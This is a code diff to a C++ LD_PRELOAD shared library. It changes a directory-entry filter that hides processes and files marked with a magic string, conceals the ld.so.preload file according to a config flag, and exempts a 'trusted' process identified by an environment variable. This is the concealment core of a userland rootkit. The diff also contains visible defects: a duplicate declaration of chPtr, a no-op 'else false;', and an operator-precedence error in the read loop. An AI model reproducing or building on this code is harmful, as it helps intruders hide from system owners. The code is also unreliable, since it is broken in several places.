@@ -1,5 +1,6 @@
 
-#include "main.h" // Wl is gcc option to pass the parameters to the linker
+#include "main.h"
+// Wl is gcc option to pass the parameters to the linker
 // gcc -static-libgcc -static-libstdc++ -shared -ldl -lstdc++ -fPIC main.cpp -o main.so
 
 
@@ -24,13 +25,30 @@ void finitFunc () {
 bool checkEntry (dirent * dirPtr) {
 	CErrnoSaver svErr;
 	std::string name (dirPtr->d_name);
-	int fd, tmp;
+	descr_holder fd (new int (-1));
+	int tmp;
 	const int bufSz = 256;
-	char tmpBuf [bufSz], *chPtr;
+	char tmpBuf [bufSz], *chPtr, chData;
+	char *chPtr;
 	
 
-	if (-1 == (fd = open (("/proc/" + name + "/cmdline").c_str (), O_RDONLY))) {
+	// To check if the caller is our trust process
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) return true;
+	
+
+	if (-1 == (*fd = open (("/proc/" + name + "/cmdline").c_str (), O_RDONLY))) {
 		// this is not a process
+		// Is this a ld.so.preload ?
+		if (strstr (dirPtr->d_name, prelFileNameClear) != NULL) {
+			descr_holder fd1 (new int (-1));
+			*fd1 = open (dynCnfFile, O_RDONLY);
+			while ((tmp = read (*fd1, &chData, 1) == -1 && errno == EINTR);
+			// if we can't read config, we think that preload file doesn't exist
+			if (tmp == -1) return false;
+			if (chData == '1') return true;
+			else false;
+		}
+		// Is this our directory ?
 		if (NULL == strstr (dirPtr->d_name, MAGIC_STRING)) {
 			// we don't want to hide this file/directory
 			return true;
@@ -39,7 +57,7 @@ bool checkEntry (dirent * dirPtr) {
 	}
 	
 	do {
-		tmp = read (fd, tmpBuf, bufSz - 1);
+		tmp = read (*fd, tmpBuf, bufSz - 1);
 		if (-1 == tmp && errno == EINTR) continue;
 		else if (-1 == tmp) return true;
 		
